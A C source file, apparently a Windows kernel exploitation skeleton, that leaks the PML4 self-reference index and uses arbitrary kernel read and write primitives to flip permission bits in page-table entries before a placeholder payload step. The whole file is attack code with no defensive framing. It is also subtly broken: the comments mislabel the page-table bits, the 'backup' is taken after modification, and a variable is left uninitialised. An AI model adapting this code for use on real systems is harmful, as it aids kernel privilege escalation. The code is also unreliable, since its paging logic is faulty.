/** Flips bits in PTE
 * Sources:
    * https://github.com/ommadawn46/HEVD-Exploit-Win10-22H2-KVAS?source=post_page-----b407c6f5b8f7--------------------------------
    * https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows
*/

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define MiGetPteAddress_0x13_addr 0xDEADBEEF

uint64_t    arbitrary_read(uint64_t address);
VOID        arbitrary_write(uint64_t value, uint64_t address);
VOID        kernel_base;


// Leak PML4 base address using MiGetPteAddress_0x13_addr
uint64_t leak_pml4_base(uint64_t mi_get_pte_address_addr) {
    return arbitrary_read(mi_get_pte_address_addr);
}

// Calculate the index of the self-referencing PML4 entry
uintptr_t calculate_pml4_self_reference_index(uint64_t MiGetPteAddress_0x13) {
    uint64_t pml4_base = leak_pml4_base(MiGetPteAddress_0x13); // Replace with actual PTE address
    return (pml4_base >> 39) & 0x1FF; // Extract bits 39-47 for PML4 index
}

// Calculate the index of the page address
uintptr_t calculate_page_address_index(uint64_t virtual_address) {
    return (virtual_address >> 39) & 0x1FF;
}

// Calculate the address of the page table entry (PTE)
uint64_t calculate_page_table_entry_address(uint64_t virtual_address, uint64_t pml4_base) {
    return (((uint64_t)virtual_address >> 9) & 0x7FFFFFFFF8) + pml4_base;
}

// Calculate the PML4 address given the PML4 self-reference index and address index
uint64_t calculate_pml4_address(uintptr_t pml4_self_ref_index, uintptr_t address_index) {
    uintptr_t pml4_address = 0xFFFF; // Start with high 16 bits for canonical form
    pml4_address = (pml4_address << 9) | pml4_self_ref_index; // Set PML4 Index (bits 39-47)
    pml4_address = (pml4_address << 9) | pml4_self_ref_index; // Set PDPT Index (bits 30-38)
    pml4_address = (pml4_address << 9) | pml4_self_ref_index; // Set PDT Index (bits 21-29)
    pml4_address = (pml4_address << 9) | pml4_self_ref_index; // Set PT Index (bits 12-20)
    pml4_address = (pml4_address << 12) | (address_index * 8); // Set Offset for PML4E (8 bytes per entry)
    
    return pml4_address;
}

int main() {
    // Example values for target addresses
    uint64_t virtual_address;
    uint64_t pml4_self_ref_index = calculate_pml4_self_reference_index(MiGetPteAddress_0x13_addr);
    uint64_t address_index = calculate_page_address_index(virtual_address);
    uint64_t pml4_base = leak_pml4_base(MiGetPteAddress_0x13_addr);
    
    // Calculate PML4 and PTE addresses
    uint64_t target_pml4_address = calculate_pml4_address(pml4_self_ref_index, address_index);
    uint64_t target_pte_address = calculate_page_table_entry_address(virtual_address, pml4_base); // Virtual address example
    
    // Read the values from PML4 and PTE
    uint64_t pml4_entry_value = arbitrary_read(target_pml4_address);
    uint64_t pte_entry_value = arbitrary_read(target_pte_address);
    
    // Flip the 63rd bit (user/supervisor bit) to flip access control in PML4 and PTE ALSO flip 2nd bit if usermode address
    pml4_entry_value &= ~(1ULL << 63);
    pte_entry_value &= ~(1ULL << 63);
    //pml4_entry_value &= ~(1ULL << 2);
    //pte_entry_value &= ~(1ULL << 2);


    // Backup original values
    uint64_t backup_pml4_value = pml4_entry_value;
    uint64_t backup_pte_value = pte_entry_value;
    
    // Write modified values back to PML4 and PTE
    arbitrary_write(pml4_entry_value, target_pml4_address);
    arbitrary_write(pte_entry_value, target_pte_address);
    
    // Execute payload (hypothetically, some exploitation code here)
    
    // Restore the original values after payload execution
    arbitrary_write(backup_pml4_value, target_pml4_address);
    arbitrary_write(backup_pte_value, target_pte_address);
    
    return 0;
}
